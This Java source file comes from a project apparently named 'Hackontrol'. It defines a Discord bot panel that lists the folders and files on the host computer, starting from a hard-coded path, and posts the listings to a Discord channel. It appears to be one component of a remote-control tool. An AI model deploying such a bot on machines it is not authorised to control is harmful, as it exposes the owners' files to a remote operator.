package com.khopan.hackontrol.panel;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.service.interaction.ButtonManager;
import com.khopan.hackontrol.service.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.service.interaction.ModalManager;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.LargeMessage;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.widget.ControlWidget;

import net.dv8tion.jda.api.interactions.callbacks.IReplyCallback;
import net.dv8tion.jda.api.interactions.components.ItemComponent;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;

public class FilePanel extends Panel {
	private static final String PANEL_NAME = "file";

	private static final Button BUTTON_LIST_ROOT       = ButtonManager.staticButton(ButtonType.SUCCESS, "List Root", "listRoot");

	private static final String PATHNAME_SYSTEM_ROOT   = "SYSTEMROOT";
	private static final String KEY_SHELL_OBJECT_INDEX = "shellObjectIndex";

	@Override
	public String panelName() {
		return FilePanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.BUTTON, FilePanel.BUTTON_LIST_ROOT, context -> this.sendFileList(new File("D:\\VMImage"), context));
	}

	@Override
	public ControlWidget[] controlWidget() {
		return new ControlWidget[] {
				ControlWidget.newBuilder()
				.actionRow(FilePanel.BUTTON_LIST_ROOT)
				.build()
		};
	}

	private void sendFileList(File folder, IReplyCallback callback) {
		File[] files;
		String pathName;

		if(folder == null) {
			files = File.listRoots();
			pathName = FilePanel.PATHNAME_SYSTEM_ROOT;
		} else {
			if(!folder.isDirectory()) {
				folder = folder.getParentFile();
			}

			files = folder.listFiles();
			pathName = folder.getAbsolutePath();

			if(pathName.endsWith("\\")) {
				pathName += '\\';
			}
		}

		if(files.length == 1 && files[0].isDirectory()) {
			this.sendFileList(files[0], callback);
			return;
		}

		List<File> fileList = new ArrayList<>();
		List<File> folderList = new ArrayList<>();

		for(File file : files) {
			if(file.isDirectory()) {
				folderList.add(file);
			} else {
				fileList.add(file);
			}
		}

		StringBuilder builder = new StringBuilder();
		builder.append("**");
		builder.append(pathName);
		builder.append("**");
		int index = 0;

		if(!folderList.isEmpty()) {
			builder.append("\n***Folder***");
		}

		for(File file : folderList) {
			builder.append("\n`");
			builder.append(++index);
			builder.append(") ");
			builder.append(folder == null ? file.getAbsolutePath() : file.getName());
			builder.append('`');
		}

		if(!fileList.isEmpty()) {
			builder.append("\n***File***");
		}

		for(File file : fileList) {
			builder.append("\n`");
			builder.append(++index);
			builder.append(") ");
			builder.append(file.getName());
			builder.append('`');
		}

		File finalFolder = folder;
		LargeMessage.send(builder.toString(), callback, (request, identifiers) -> {
			List<ItemComponent> list = new ArrayList<>();

			if(!folderList.isEmpty()) {
				list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Inside", context -> this.buttonInside(context, folderList)));
			}

			list.add(ButtonManager.dynamicButton(ButtonType.SUCCESS, "Refresh", context -> {
				this.sendFileList(finalFolder, context);
				HackontrolButton.deleteMessages(context);
			}));

			list.add(HackontrolButton.delete(identifiers));
			request.addActionRow(list);
		});
	}

	private void buttonInside(ButtonContext context, List<File> folderList) {
		if(folderList.size() == 1) {
			this.sendFileList(folderList.get(0), context);
			HackontrolButton.deleteMessages(context);
			return;
		}

		int start = 1;
		int end = folderList.size();
		TextInput folderInput = TextInput.create(FilePanel.KEY_SHELL_OBJECT_INDEX, "Folder Index", TextInputStyle.SHORT)
				.setRequired(true)
				.setMinLength(Integer.toString(start).length())
				.setMaxLength(Integer.toString(end).length())
				.setPlaceholder(start + " - " + end)
				.build();

		context.replyModal(ModalManager.dynamicModal("Inside", modalContext -> {
			int index;

			try {
				index = Integer.parseInt(modalContext.getValue(FilePanel.KEY_SHELL_OBJECT_INDEX).getAsString());
			} catch(Throwable Errors) {
				HackontrolError.message(modalContext.reply(), "Invalid number format");
				return;
			}

			if(index < 1 || index > end) {
				HackontrolError.message(modalContext.reply(), "Index " + index + " out of bounds, expected " + start + " - " + end);
				return;
			}

			this.sendFileList(folderList.get(index - 1), modalContext);
			HackontrolButton.deleteMessages(context);
		}).addActionRow(folderInput).build()).queue();
	}
}
